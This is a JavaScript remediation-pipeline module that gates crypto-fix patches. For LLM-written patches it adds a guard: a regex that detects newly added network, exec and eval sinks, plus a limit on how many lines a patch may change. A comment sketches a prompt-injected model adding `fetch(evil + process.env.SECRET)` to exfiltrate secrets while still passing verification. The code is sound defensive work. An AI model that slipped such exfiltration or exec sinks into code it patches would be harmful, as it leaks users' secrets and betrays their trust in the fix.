import { checkPatchPolicy } from "./patch-policy.js";
import { verifyFix } from "./verify.js";
/** True when `after` is a strict improvement over `before` for `finding`. */
function passesVerify(before, after, finding) {
    const targetGone = !after.some((x) => x.ruleId === finding.ruleId);
    const noNewRuleTypes = after.every((x) => before.some((b) => b.ruleId === x.ruleId));
    return targetGone && noNewRuleTypes && after.length < before.length;
}
/**
 * Exfiltration / RCE primitives an LLM "crypto fix" should never *newly*
 * introduce. `verifyFix` only proves the crypto finding is gone — it is blind to
 * the rest of a full-file rewrite, so an injected/hostile model could drop the
 * RSA call and add `fetch(evil + process.env.SECRET)` and still pass. This guard
 * runs ONLY on `source: "llm"` patches (codemods are deterministic + trusted).
 */
// Node built-in exfil/RCE modules, matched with an OPTIONAL `node:` prefix
// (idiomatic modern Node — the bare-only form was bypassable) and in BOTH
// require()/import() call forms AND static `import … from "…"` — the static
// form has no parens so the old dynamic-only pattern missed it entirely.
const SINK_MODULES = "child_process|http|https|http2|net|tls|dns|dgram";
const NEW_SINK_RE = new RegExp("\\b(?:fetch|XMLHttpRequest|WebSocket|navigator\\.sendBeacon|child_process|execSync|execFileSync|spawnSync|exec(?:File)?\\s*\\(|spawn\\s*\\(|eval\\s*\\(|new\\s+Function|os\\.system|subprocess|Runtime\\.getRuntime" +
    `|require\\s*\\(\\s*['"](?:node:)?(?:${SINK_MODULES})['"]` +
    `|import\\s*\\(\\s*['"](?:node:)?(?:${SINK_MODULES})['"]` +
    `|import\\s+[^;\\n]{0,200}?from\\s*['"](?:node:)?(?:${SINK_MODULES})['"])`, "g");
/** Stateless (non-global) sibling of {@link NEW_SINK_RE} for per-line `.test()`. */
const NEW_SINK_LINE_RE = new RegExp(NEW_SINK_RE.source);
/** Max changed lines allowed in an auto-verified LLM patch — a real crypto fix
 * is localized; a sprawling rewrite is not reviewable as "just the fix". */
const LLM_PATCH_MAX_CHANGED_LINES = 60;
function countMatches(re, s) {
    return (s.match(re) ?? []).length;
}
/** Changed lines (removed + added) between two revisions, ignoring the shared
 * prefix/suffix — same shape the CLI's unified-diff uses. */
function changedLineCount(before, after) {
    const a = before.split("\n");
    const b = after.split("\n");
    let start = 0;
    while (start < a.length && start < b.length && a[start] === b[start])
        start++;
    let endA = a.length - 1;
    let endB = b.length - 1;
    while (endA >= start && endB >= start && a[endA] === b[endB]) {
        endA--;
        endB--;
    }
    return Math.max(0, endA - start + 1) + Math.max(0, endB - start + 1);
}
/** Reason an LLM patch is unsafe to auto-verify, or null when it is bounded. */
function llmPatchRisk(before, patch) {
    // Reject any exfil/RCE sink on a line the patch ADDS. More robust than a bare
    // count: it catches a sink SWAPPED into a file that already had one, and does
    // not depend on the total count rising (trimmed line-set membership).
    const beforeLines = new Set(before.split("\n").map((l) => l.trim()));
    const addsSink = patch.newContent
        .split("\n")
        .some((l) => !beforeLines.has(l.trim()) && NEW_SINK_LINE_RE.test(l));
    if (addsSink) {
        return "LLM patch adds a network/exec/eval sink on a new line (possible prompt-injection); rejected — review the diff manually";
    }
    // Backstop: the total sink count must not rise either.
    if (countMatches(NEW_SINK_RE, patch.newContent) > countMatches(NEW_SINK_RE, before)) {
        return "LLM patch introduces a new network/exec/eval sink (possible prompt-injection); rejected — review the diff manually";
    }
    const changed = changedLineCount(before, patch.newContent);
    if (changed > LLM_PATCH_MAX_CHANGED_LINES) {
        return `LLM patch changes ${changed} lines (> ${LLM_PATCH_MAX_CHANGED_LINES}); too broad to auto-verify — review the diff manually`;
    }
    return null;
}
/**
 * Run each finding through patchSource → policy → verify, collecting the patches
 * that survive both gates and the reasons the rest were dropped.
 */
export async function remediateFindings(findings, opts) {
    const applied = [];
    const rejected = [];
    for (const finding of findings) {
        const content = await opts.readContent(finding);
        const patch = await opts.patchSource(finding, content);
        if (!patch) {
            rejected.push({ finding, reason: "no deterministic fix available" });
            continue;
        }
        const decision = checkPatchPolicy(patch, opts.policy);
        if (!decision.allowed) {
            rejected.push({ finding, reason: decision.reason ?? "rejected by patch policy" });
            continue;
        }
        // Untrusted full-file LLM rewrites get a blast-radius gate the crypto-only
        // verify step can't provide (new-sink + change-size bound).
        if (patch.source === "llm") {
            const risk = llmPatchRisk(content, patch);
            if (risk) {
                rejected.push({ finding, reason: risk });
                continue;
            }
        }
        const before = verifyFix(content, { filename: finding.location.file }).findings;
        const after = verifyFix(patch.newContent, { filename: patch.path }).findings;
        if (!passesVerify(before, after, finding)) {
            rejected.push({ finding, reason: "patch did not pass the verify_fix gate" });
            continue;
        }
        applied.push({ finding, patch });
    }
    return { applied, rejected };
}
//# sourceMappingURL=remediate-pipeline.js.map